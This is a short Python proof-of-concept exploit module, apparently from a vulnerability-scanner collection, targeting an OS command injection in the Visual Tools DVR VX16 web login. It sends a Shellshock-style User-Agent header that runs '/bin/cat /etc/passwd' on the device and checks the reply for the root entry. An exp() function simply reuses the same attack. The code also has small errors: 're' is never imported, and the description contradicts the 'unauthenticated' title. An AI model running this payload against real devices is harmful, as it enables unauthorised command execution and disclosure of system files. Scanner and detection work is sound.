import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Visual Tools DVR VX16 4.2.28.0 - OS Command Injection (Unauthenticated)''',
        "description": '''vulnerabilities in the web-based management interface of Visual Tools DVR VX16 4.2.28.0 could allow an authenticated, remote attacker to perform command injection attacks against an affected device.''',
        "severity": "critical",
        "references": [
            "https://www.exploit-db.com/exploits/50098"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["visualtools", "rce", "oast", "injection"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/cgi-bin/slogin/login.py"""
        method = "GET"
        data = """"""
        headers = {'Accept': '*/*', 'User-Agent': '() { :; }; echo ; echo ; /bin/cat /etc/passwd'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if (re.search(r"""root:.*:0:0""",resp0.text)) and (resp0.status_code == 200):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url